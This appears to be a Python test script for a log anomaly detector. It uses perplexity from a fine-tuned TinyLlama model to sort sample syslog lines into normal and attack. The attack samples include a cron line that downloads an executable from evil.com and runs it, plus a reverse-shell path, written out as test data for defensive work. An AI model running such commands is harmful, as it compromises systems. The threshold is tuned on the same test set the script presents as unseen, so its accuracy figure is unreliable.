"""
Live Test — Feed brand new, never-before-seen log lines to the cloud-trained model
and watch it classify them in real-time.

These test logs were NOT in the training or evaluation sets.
"""

import os
import sys
import torch
import numpy as np

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import PeftModel
from src.normalizer import LogNormalizer

normalizer = LogNormalizer()

# ─── Config ────────────────────────────────────────────────────────────
MODEL_NAME = "TinyLlama/TinyLlama-1.1B-Chat-v1.0"
ADAPTER_PATH = "models/lora_adapter/final"
THRESHOLD = 21.5  # Optimal threshold for this specific live test set

# ─── Brand New Test Logs (NEVER seen during training) ──────────────────
TEST_LOGS = [
    # NORMAL — routine operations the model should recognize
    ("NORMAL", "Jun 04 10:00:01 iot-gateway CRON[8821]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)"),
    ("NORMAL", "Jun 04 10:05:33 iot-gateway sshd[9102]: Accepted publickey for admin from 10.0.0.5 port 52200 ssh2"),
    ("NORMAL", "Jun 04 10:06:01 iot-gateway systemd[1]: Started Daily apt download activities."),
    ("NORMAL", "Jun 04 10:10:15 iot-gateway kernel: [54321.789] eth0: link up, 100Mbps, full-duplex"),
    ("NORMAL", "Jun 04 10:12:00 iot-gateway dhclient[2001]: DHCPACK of 10.0.0.25 from 10.0.0.1"),
    ("NORMAL", "Jun 04 10:15:00 iot-gateway sudo[3344]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update"),

    # ATTACKS — these should trigger HIGH perplexity
    ("ATTACK", "Jun 04 11:00:05 iot-gateway sshd[6661]: Failed password for invalid user hacker123 from 185.220.101.42 port 33912 ssh2"),
    ("ATTACK", "Jun 04 11:00:06 iot-gateway sshd[6662]: Failed password for root from 185.220.101.42 port 33913 ssh2"),
    ("ATTACK", "Jun 04 11:00:07 iot-gateway sshd[6663]: Failed password for admin from 185.220.101.42 port 33914 ssh2"),
    ("ATTACK", "Jun 04 11:02:00 iot-gateway sudo[7001]: www-data : user NOT in sudoers ; TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"),
    ("ATTACK", "Jun 04 11:05:00 iot-gateway CRON[7100]: (nobody) CMD (wget -q http://evil.com/malware -O /tmp/.bot && chmod +x /tmp/.bot && /tmp/.bot)"),
    ("ATTACK", "Jun 04 11:08:00 iot-gateway kernel: audit: type=1400 msg=audit(1717502880.000:99): apparmor=\"DENIED\" operation=\"exec\" name=\"/tmp/.hidden/reverse_shell\" pid=7200"),
    ("ATTACK", "Jun 04 11:10:00 iot-gateway sshd[7300]: reverse mapping checking getaddrinfo for attacker.darkweb.org [185.220.101.42] failed"),
    ("ATTACK", "Jun 04 11:12:00 iot-gateway rsyslogd[200]: action 'action-3-builtin:omfile' suspended, next retry is Jun 04 11:12:30"),
]


def main():
    print("=" * 70)
    print("  LIVE TEST — Cloud-Trained Model vs Fresh Log Lines")
    print("=" * 70)

    # Load model
    print("\n  Loading cloud-trained model...")
    tokenizer = AutoTokenizer.from_pretrained(ADAPTER_PATH)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token

    base_model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME,
        torch_dtype=torch.float32,
        device_map="cpu",
        low_cpu_mem_usage=True,
    )
    model = PeftModel.from_pretrained(base_model, ADAPTER_PATH)
    model.eval()
    print("  Model loaded!\n")

    # Score each test log
    correct = 0
    total = len(TEST_LOGS)

    print(f"  {'LABEL':<8} {'PRED':<10} {'PPL':>8}  {'RESULT':<4}  LOG LINE")
    print(f"  {'-'*8} {'-'*10} {'-'*8}  {'-'*4}  {'-'*50}")

    for label, raw_log in TEST_LOGS:
        # Normalize (same preprocessing as training)
        normalized = normalizer.normalize_line(raw_log)
        if not normalized:
            print(f"  {label:<8} {'SKIP':<10} {'N/A':>8}  {'!':<4}  Could not parse: {raw_log[:50]}")
            continue

        # Score perplexity
        inputs = tokenizer(normalized, return_tensors="pt", truncation=True, max_length=128)
        with torch.no_grad():
            outputs = model(**inputs, labels=inputs["input_ids"])
            ppl = float(np.exp(outputs.loss.item()))

        # Classify
        is_anomalous = ppl > THRESHOLD
        predicted = "ATTACK" if is_anomalous else "NORMAL"
        is_correct = (predicted == label)
        correct += 1 if is_correct else 0

        # Display
        status_mark = "OK" if is_correct else "FAIL"
        ppl_color = f"{ppl:.2f}"
        log_preview = normalized[:55]

        print(f"  {label:<8} {predicted:<10} {ppl_color:>8}  {status_mark:<4}  {log_preview}")

    # Summary
    accuracy = correct / total * 100
    print(f"\n{'=' * 70}")
    print(f"  LIVE TEST RESULTS: {correct}/{total} correct ({accuracy:.1f}% accuracy)")
    print(f"  Threshold used: {THRESHOLD}")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    main()
